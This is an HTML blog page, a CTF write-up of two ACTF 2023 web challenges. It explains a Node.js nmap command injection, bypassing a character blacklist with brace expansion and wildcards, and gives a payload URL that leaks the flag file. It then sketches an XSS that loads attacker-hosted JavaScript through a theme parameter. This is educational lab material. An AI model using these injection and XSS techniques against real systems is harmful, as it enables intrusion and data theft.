@@ -1,0 +1,682 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Potat0w0">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ACTF2023MyGO’s Live!!!!!启动题目环境：  根路由 1234567891011app.get(&amp;#x27;&#x2F;&amp;#x27;, (req, res) &#x3D;&gt; &amp;#123;  fs.readFile(__dirname + &amp;#x27;&#x2F;public&#x2F;index.html&amp;#x27;, &amp;#x27;utf8&amp;#x27;, (err, data) &#x3D;&gt; &amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF">
+<meta property="og:url" content="http://example.com/2023/11/01/ACTF/index.html">
+<meta property="og:site_name" content="Potat0w0">
+<meta property="og:description" content="ACTF2023MyGO’s Live!!!!!启动题目环境：  根路由 1234567891011app.get(&amp;#x27;&#x2F;&amp;#x27;, (req, res) &#x3D;&gt; &amp;#123;  fs.readFile(__dirname + &amp;#x27;&#x2F;public&#x2F;index.html&amp;#x27;, &amp;#x27;utf8&amp;#x27;, (err, data) &#x3D;&gt; &amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101103741050.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101115223464.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101115634594.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101115732757.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101115927703.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231101134511895.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231108110120457.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231108110737402.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231108111028807.png">
+<meta property="og:image" content="http://example.com/2023/11/01/ACTF/image-20231108110937618.png">
+<meta property="article:published_time" content="2023-11-01T02:32:37.000Z">
+<meta property="article:modified_time" content="2023-11-08T03:21:46.639Z">
+<meta property="article:author" content="Potat0w0">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/11/01/ACTF/image-20231101103741050.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ACTF - Potat0w0</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Potat0w0&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ACTF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Potat0w0
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-01 10:32" pubdate>
+          November 1, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ACTF</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on 16 days ago
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ACTF2023"><a href="#ACTF2023" class="headerlink" title="ACTF2023"></a>ACTF2023</h1><h2 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h2><p>启动题目环境：</p>
+<p><img src="/2023/11/01/ACTF/image-20231101103741050.png" srcset="/img/loading.gif" lazyload></p>
+<p>根路由</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  fs.<span class="hljs-title function_">readFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Internal Server Error&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// Send the HTML content</span><br>      res.<span class="hljs-title function_">send</span>(data);<br>    &#125;<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;checker路由：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/checker&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> url = req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>;<br>  <br>  <span class="hljs-keyword">if</span> (url) &#123;<br>    <span class="hljs-keyword">if</span> (url.<span class="hljs-property">length</span> &gt; <span class="hljs-number">60</span>) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;我喜欢你&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    url = [...url].<span class="hljs-title function_">map</span>(escaped).<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url);<br><br>    <span class="hljs-keyword">let</span> host;<br>    <span class="hljs-keyword">let</span> port;<br>    <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;:&quot;</span>)) &#123;<br>      <span class="hljs-keyword">const</span> parts = url.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;:&quot;</span>);<br>      host = parts[<span class="hljs-number">0</span>];<br>      port = parts.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;:&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      host = url;<br>    &#125;<br>    <span class="hljs-keyword">let</span> command = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// console.log(host);</span><br>    <span class="hljs-comment">// console.log(port);</span><br><br>    <span class="hljs-keyword">if</span> (port) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(<span class="hljs-built_in">parseInt</span>(port))) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;我喜欢你&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, port, host].<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// Construct the shell command</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;80&quot;</span>, host].<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot; &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> fdout = fs.<span class="hljs-title function_">openSync</span>(<span class="hljs-string">&#x27;stdout.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">var</span> fderr = fs.<span class="hljs-title function_">openSync</span>(<span class="hljs-string">&#x27;stderr.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br>    nmap = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;bash&quot;</span>, [<span class="hljs-string">&quot;-c&quot;</span>, command], &#123;<span class="hljs-attr">stdio</span>: [<span class="hljs-number">0</span>,fdout,fderr] &#125; );<br><br>    nmap.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">code</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;child process exited with code &#x27;</span> + code.<span class="hljs-title function_">toString</span>());<br>      <span class="hljs-keyword">if</span> (code !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">let</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;stderr.log&#x27;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error executing command: <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Error executing command!!! <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">let</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;stdout.log&#x27;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Ok: <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>      &#125;<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;No parameter provided.&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>逐行解释：</p>
+<p>url变量从请求的url参数获值，如果url长度大于60渲染”我喜欢你”，</p>
+<p>该行代码将url字符串分隔为字符数组逐个参与escaped()函数，最后再连接起来成为一个新的字符串</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">url = [...url].<span class="hljs-title function_">map</span>(escaped).<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>escaped()函数中一共过滤了以下字符：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; &#x27;<span class="hljs-comment">//空格</span><br>&#x27;$&#x27;<br>&#x27;\&#x27;<br>&#x27;`&#x27;<span class="hljs-comment">//反引号</span><br>&#x27;&quot;&#x27;<br>&#x27;|&#x27;<br>&#x27;&amp;&#x27;<br>&#x27;;&#x27;<br>&#x27;&lt;&#x27;<br>&#x27;&gt;&#x27;<br>&#x27;(&#x27;<br>&#x27;)&#x27;<br>&#x27;&#x27;&#x27;<br>&#x27;\n&#x27;<br>&#x27;*&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>下面判断url中是否存在<code>:</code>，对host和port进行赋值</p>
+<p>然后拼接构造一个nmap的命令，将各个字符串用空格分隔开拼接起来：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (port) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(<span class="hljs-built_in">parseInt</span>(port))) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;我喜欢你&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, port, host].<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// Construct the shell command</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;80&quot;</span>, host].<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>起一个bash进程执行nmap命令：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">nmap = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;bash&quot;</span>, [<span class="hljs-string">&quot;-c&quot;</span>, command], &#123;<span class="hljs-attr">stdio</span>: [<span class="hljs-number">0</span>,fdout,fderr] &#125; );<br></code></pre></td></tr></table></figure>
+
+<p>对nmap对象进行处理，发现：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> fdout = fs.<span class="hljs-title function_">openSync</span>(<span class="hljs-string">&#x27;stdout.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">var</span> fderr = fs.<span class="hljs-title function_">openSync</span>(<span class="hljs-string">&#x27;stderr.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br>nmap = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;bash&quot;</span>, [<span class="hljs-string">&quot;-c&quot;</span>, command], &#123;<span class="hljs-attr">stdio</span>: [<span class="hljs-number">0</span>,fdout,fderr] &#125; );<br>nmap.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;child process exited with code &#x27;</span> + code.<span class="hljs-title function_">toString</span>());<br>  <span class="hljs-keyword">if</span> (code !== <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">let</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;stderr.log&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error executing command: <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Error executing command!!! <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">let</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;stdout.log&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Ok: <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>将报错结果存入stderr.log，将进程的运行结果存入stdout.log，(而不是过程中的)</p>
+<p>那么如何获得nmap的运行结果呢？翻阅namp的使用手册，总结出了两个可以用的参数：</p>
+<p><code>-iL</code>：从外部打开文件，读取里面的ip地址进行扫描；</p>
+<p><code>-oN</code>：将执行结果存入外部文件中，可以将结果写入静态目录直接读取</p>
+<p>使用-iL时发现如果打开的文件中不存在合法ip，返回的错误中就会存在文件的内容：</p>
+<p><img src="/2023/11/01/ACTF/image-20231101115223464.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来只需要将这个报错的结果存到外部文件直接访问就好了，但是现在问题来了，上面被过滤了那么多的字符该怎么绕过</p>
+<p>观察我们期望传入的字符，空格被ban了是最大的问题，曾经在另一篇文章中总结过相关的trick，这里$都被ban了，那么就试试{,}，Linux中可用{,}来无空格执行命令：</p>
+<p><img src="/2023/11/01/ACTF/image-20231101115634594.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试成功：</p>
+<p><img src="/2023/11/01/ACTF/image-20231101115732757.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后一个问题就是，在Dockerfile对flag的处理中发现flag被拼接上了-加上16个随机字符，思路是正则绕过，但是*被ban了，但是知道位数，可以用?来匹配：</p>
+<p><img src="/2023/11/01/ACTF/image-20231101115927703.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后将结果写入stdout.log：</p>
+<p>payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.1</span>:<span class="hljs-number">36002</span><span class="hljs-regexp">/checker?url=&#123;-iL,/</span>flag-????????????????,-oN,stdout.log&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/01/ACTF/image-20231101134511895.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Easylatex"><a href="#Easylatex" class="headerlink" title="Easylatex"></a>Easylatex</h2><p>一道xss</p>
+<p><img src="/2023/11/01/ACTF/image-20231108110120457.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span>   &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">md5</span>(username) != password) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>, &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;login failed&#x27;</span> &#125;)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    <span class="hljs-keyword">let</span> token = <span class="hljs-title function_">sign</span>(&#123; username, <span class="hljs-attr">isVip</span>: <span class="hljs-literal">false</span> &#125;)<br>    res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token)<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>查看路由以用户名的md5为密码进行登录，登陆成功后给Cookie中的token设置为非vip</p>
+<p>preview路由：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/preview&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> &#123; tex, theme &#125; = req.<span class="hljs-property">query</span><br>    <span class="hljs-keyword">if</span> (!tex) &#123;<br>        tex = <span class="hljs-string">&#x27;Today is \\today.&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">const</span> nonce = <span class="hljs-title function_">getNonce</span>(<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">let</span> base = <span class="hljs-string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span><br>    <span class="hljs-keyword">if</span> (theme) &#123;<br>        base = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(theme, <span class="hljs-string">`http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="hljs-string">&#x27;/&#x27;</span><br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;preview.html&#x27;</span>, &#123; tex, nonce, base &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p><code>base = new URL(theme, http://$&#123;req.headers.host&#125;/theme/) + &#39;/&#39;</code>这一段代码，theme我们是可控的</p>
+<p><img src="/2023/11/01/ACTF/image-20231108110737402.png" srcset="/img/loading.gif" lazyload></p>
+<p>拼接完之后：</p>
+<p><img src="/2023/11/01/ACTF/image-20231108111028807.png" srcset="/img/loading.gif" lazyload></p>
+<p>这道题XSS漏洞存在的关键是一个URL构造方法引起的，theme可控，我们可以把它指向自己的服务器：</p>
+<p><img src="/2023/11/01/ACTF/image-20231108110937618.png" srcset="/img/loading.gif" lazyload></p>
+<p>服务器上装载恶意的js让网页来加载：</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/11/Minecraft-ApacheLog4j2/" title="Minecraft-ApacheLog4j2">
+                        <span class="hidden-mobile">Minecraft-ApacheLog4j2</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
